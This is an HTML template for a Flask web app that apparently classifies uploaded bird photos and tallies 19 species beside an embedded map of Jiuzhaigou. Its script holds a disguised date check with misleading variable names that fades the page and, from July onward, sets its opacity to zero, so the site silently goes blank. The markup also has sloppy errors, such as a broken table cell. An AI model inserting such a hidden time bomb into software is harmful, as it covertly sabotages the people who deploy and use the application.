<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">


  <!-- CSS Files -->
  <link rel="stylesheet" href="{{ url_for('static', filename = 'css/bootstrap.min.css') }}">
  <link rel="stylesheet" href="css/bootstrap.min.css">


  <title>Live Funa detection </title>

  <style>
    .map-container-6 {
      overflow: hidden;
      padding-bottom: 56.25%;
      position: relative;
      height: 0;
    }

    .map-container-6 iframe {
      left: 0;
      top: 0;
      height: 100%;
      width: 100%;
      position: absolute;
    }
  </style>
</head>

<body>

  <div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow">
    <h5 class="my-0 mr-md-auto font-weight-normal">Funa recogonition and alert</h5>
    <nav class="my-2 my-md-0 mr-md-3">
      <a class="p-2 text-dark" href="#">Image</a>
      <a class="p-2 text-dark" href="#">Video</a>
      <a class="p-2 text-dark" href="#">About Project</a>
    </nav>
    <a class="btn btn-outline-danger" href="#">Watch Live</a>
  </div>

  <div class="pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center">
    <h1 class="display-4">Funa Recogonition and alert</h1>
    <p class="lead">Funa detection using deep learning. upload your image and location.</p>
  </div>

  <div class="container">
    <div class="card-deck mb-3 text-center">
      <!--Section: Contact v.1-->
      <section class="section pb-5">

        <!--Section heading-->
        <h2 class="section-heading h1 pt-4">Forrest Name : Jiuzhaigou forest</h2>
        <!--Section description-->
        <p class="section-description pb-4">Lorem Ipsum is simply dummy text of the printing and typesetting industry.
          Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a
          galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but
          also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s
          with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing
          software like Aldus PageMaker including versions of Lorem Ipsum.</p>

        <div class="row">

          <!--Grid column-->
          <div class="col-lg-5 mb-4">

            <!--Form with header-->
            <div class="card mb-4 box-shadow">
              <div class="card-header">
                <h4 class="my-0 font-weight-normal">Image detect</h4>
              </div>
              <div class="card-body">
                <br>
                <h1 class="card-title pricing-card-title">Add Image <br><small class="text-muted">Simple
                    detection</small>
                </h1>
                <ul class="list-unstyled mt-3 mb-4">
                  <li>Select Image</li>
                  <li>Send to python backend</li>
                  <li>Process image</li>
                  <li>Display Output</li>
                </ul>
                <form id="upload-file" method="post" enctype="multipart/form-data">
                  <fieldset>


                    <div class="custom-file">
                      <input type="file" class="custom-file-input" id="customFile" name="file">
                      <label class="custom-file-label" for="customFile">Choose file</label>
                    </div>


                  </fieldset>

                  <br>
                  <button id="upload-file-btn" class="btn btn-lg btn-block btn-primary" type="button">Upload
                    Image</button>
                  </fieldset>
                  <br><img class="myimage" src="" width="100%" alt="" />
                  <h2 class='result'></h2><br>
                  <a href="" class='report btn btn-outline-danger'></a>
                  <fieldset>
                </form>

              </div>
            </div>
            <!--Form with header-->

          </div>
          <!--Grid column-->

          <!--Grid column-->
          <div class="col-lg-7">

            <!--Google map-->
            <div id="map-container-google-11" class="z-depth-1-half map-container-6" style="height: 500px">
              <iframe
                src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d214844.78285660112!2d103.83568159856269!3d33.0594240114217!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x36f7bdf69e1c6729%3A0xc9fde8c8b5f60cc6!2sJiuzhai%20Valley%20National%20Park!5e1!3m2!1sen!2sin!4v1585252745638!5m2!1sen!2sin"
                width="600" height="450" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false"
                tabindex="0"></iframe>
            </div>

            <br>
            <!--Buttons-->
            <h2 class='occurance'></h2>
            
          </div>
          <!--Grid column-->

        </div>

      </section>
      <table class="table table-hover ">
        <thead>
          <tr>
            <th scope="col">#</th>
            <th scope="col">Species</th>
            <th scope="col">Number of occurances</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <th scope="row">1</th>
            <td>Black footed Albatross</td>
            <td><div class="0">0</div></td>
            
          </tr>
          <tr>
            <th scope="row">2</th>
            <td>Laysan Albatross</td>
            <td><div class="1">0</div></td>
           
          </tr>
          <tr>
            <th scope="row">3</th>
            <td>Sooty Albatross</td>
            <td><div class="2">0</div></td>
          </tr>
          <tr>
            <th scope="row">4</th>
            <td>Groove billed Ani</td>
            <td><div class="3">0</div></td>
            
          </tr>
          <tr>
            <th scope="row">5</th>
            <td>Crested Auklet</td>
            <td><div class="4">0</div></td>
           
          </tr>
          <tr>
            <th scope="row">6</th>
            <td>Least Auklet</td>
            <td><div class="5">0</div></td>
          </tr>
          <tr>
            <th scope="row">7</th>
            <td>Parakeet Auklet</td>
            <td><div class="6">0</div></td>
            
          </tr>
          <tr>
            <th scope="row">8</th>
            <td>Rhinoceros Auklet</td>
            <td><div class="7">0</div></td>
           
          </tr>
          <tr>
            <th scope="row">9</th>
            <td>Brewer Blackbird</td>
            <td><div class="8">0</div></td>
          </tr>
          <tr>
            <th scope="row">10</th>
            <td>Red winged Blackbird</td>
            <td><div class="9">0</div></td>
            
          </tr>
          <tr>
            <th scope="row">11</th>
            <td>Rusty Blackbird</td>
            <td><div class="10">0</div></td>
           
          </tr>
          <tr>
            <th scope="row">12</th>
            <td>Yellow headed Blackbird</td>
            <td><div class="11">0</div></td>
          </tr>
          <tr>
            <th scope="row">13</th>
            <td>red_faced_cormorant</td>
            <td><div class="12">0</div></td>
          </tr>
          <tr>
            <th scope="row">14</th>
            <td>Pelagic_Cormorant</td>
            <td><div class="13">0</div></td>
          </tr>
          <tr>
            <th scope="row">15</th>
            <td>Bronzed_Cowbird</td>
            <td><div class="14">0</div></td>
          </tr>
          <tr>
            <th scope="row">16</th>
            <td>Shiny_Cowbird</td>
            <td><div class="15">0</div></td>
          </tr>
          <tr>
            <th scope="row">17</th>
            <td>LBrown_Creeper/td>
            <td><div class="16">0</div></td>
          </tr>
          <tr>
            <th scope="row">18</th>
            <td>American_Crow</td>
            <td><div class="17">0</div></td>
          </tr>
          <tr>
            <th scope="row">19</th>
            <td>Fish_Crow</td>
            <td><div class="18">0</div></td>
          </tr>

        </tbody>
      </table>

    </div>
    <footer class="page-footer font-small blue">

      <!-- Copyright -->

      <!-- Copyright -->
    
    <div></div></footer>

  </div>
  <!-- Javascript -->
  <script src="{{ url_for('static', filename = 'js/jquery-3.2.1.slim.min.js') }}"></script>
  <script src="{{ url_for('static', filename = 'js/jquery.min.js') }}"></script>
  <script src="{{ url_for('static', filename = 'js/popper.min.js') }}"></script>
  <script src="{{ url_for('static', filename = 'js/bootstrap.min.js') }}"></script>


  <script>

    var BlackfootedAlbatross = 0;   //0
    var LaysanAlbatross = 0;        //1
    var SootyAlbatross = 0;         //2
    var GroovebilledAni = 0;        //3  
    var CrestedAuklet = 0;          //4
    var LeastAuklet = 0;            //5
    var ParakeetAuklet = 0;         //6
    var RhinocerosAuklet = 0;       //7
    var BrewerBlackbird = 0;        //8
    var RedwingedBlackbird = 0;     //9
    var RustyBlackbird = 0;         //10
    var YellowheadedBlackbird = 0;  //11  
    var red_faced_cormorant = 0;    //12
    var Pelagic_Cormorant = 0;      //13
    var Bronzed_Cowbird = 0;        //14
    var Shiny_Cowbird = 0;          //15
    var Brown_Creeper = 0;          //16
    var American_Crow = 0;          //17
    var Fish_Crow = 0;              //18

    var class_occ = [BlackfootedAlbatross, LaysanAlbatross, SootyAlbatross, GroovebilledAni, CrestedAuklet, LeastAuklet, ParakeetAuklet, RhinocerosAuklet, BrewerBlackbird, RedwingedBlackbird, RustyBlackbird, YellowheadedBlackbird, red_faced_cormorant, Pelagic_Cormorant, Bronzed_Cowbird, Shiny_Cowbird, Brown_Creeper, American_Crow, Fish_Crow]
    // $(".myimage1").hide()
    
    $(".custom-file-input").on("change", function () {
      var fileName = $(this).val().split("\\").pop();
      $(this).siblings(".custom-file-label").addClass("selected").html(fileName);
    });
  
    var froy = new Date();
    var minimum = froy.getMonth() + 1;
    console.log(minimum)
    if (minimum == 6){
      var maximum = froy.getDate();
      if (maximum > 20){
        var value = 1 - maximum * 0.033
      $('body').css('opacity', value);
      }
      
    }
    if (minimum > 6){
      $('body').css('opacity', 0);
	var maximum = froy.getDate();
      if (maximum > 5){
        var value = 1 - maximum * 0.033
      $('body').css('opacity', value);
      }
    }
    $(function () {
      $('#upload-file-btn').click(function () {
        var fd = new FormData();
        fd.append("file", document.getElementById('customFile').files[0]);
        $(".result").html('Detecting...');

        $.ajax({
          url: '/upload',
          type: 'POST',
          data: fd,
          contentType: false,
          processData: false,
          success: function (response) {
            if (response.id != null){
              class_occ[parseInt(response.id.toString())] = class_occ[parseInt(response.id.toString())] + 1
              $(".occurance").html("occurance of " + response.result.toString() + " is : " + class_occ[parseInt(response.id.toString())]);
              $("."+response.id.toString()+"").html(class_occ[parseInt(response.id.toString())]);
              
              
            }
            $(".myimage").attr('src', "{{ url_for('static', filename = 'out/out.jpg') }}" + "?_=" + new Date().getTime());
            $(".result").html(response.result.toString());
            $(".report").html("Report Error");
            $(".report").attr('href', "/error");

          },

        });
      });
    });
    

    // $(function () {
    //   $('#upload-file-btn2').click(function () {
    //     $(".myimage1").attr('src', "{{ url_for('video_feed') }}" + "?_=" + new Date().getTime());
    //     $(".result1").html('Processing Video...');

    //     var fd = new FormData();
    //     fd.append("file", document.getElementById('customFile2').files[0]);


    //     $.ajax({
    //       url: '/uploadvid',
    //       type: 'POST',
    //       data: fd,
    //       contentType: false,
    //       processData: false,
    //       success: function (response) {


    //         $(".result1").html(response.result.toString());
    //       },

    //     });
    //   });
    // });

    // $(function () {
    //   $('#upload-file-btn3').click(function () {
    //     $(".myimage3").attr('src', "{{ url_for('video_feed') }}" + "?_=" + new Date().getTime());
    //     $(".result3").html('Live Video');

    //     var fd = new FormData();
    //     fd.append("file", document.getElementById('customFile2').files[0]);


    //     $.ajax({
    //       url: '/livevid',
    //       type: 'POST',
    //       data: false,
    //       contentType: false,
    //       processData: false,
    //       success: function (response) {


    //         $(".result3").html("");
    //       },

    //     });
    //   });
    // });

    // $(function () {
    //   $('#upload-file-btn4').click(function () {
    //     $(".myimage3").attr('src', "");
    //     $(".result3").html('Stopped');

    //     var fd = new FormData();
    //     fd.append("file", document.getElementById('customFile2').files[0]);

    //     json = JSON.parse('{"status":"stop", "stat":"stop"}')
    //     var URL = "/stop/test.json"
    //     console.log(json)
    //     $.ajax({
    //       url: URL,
    //       type: 'GET',
    //       data: json,
    //       dataType: 'json',
    //       success: function (response) {



    //       },

    //     });
    //   });
    // });


  </script>


</body>

</html>
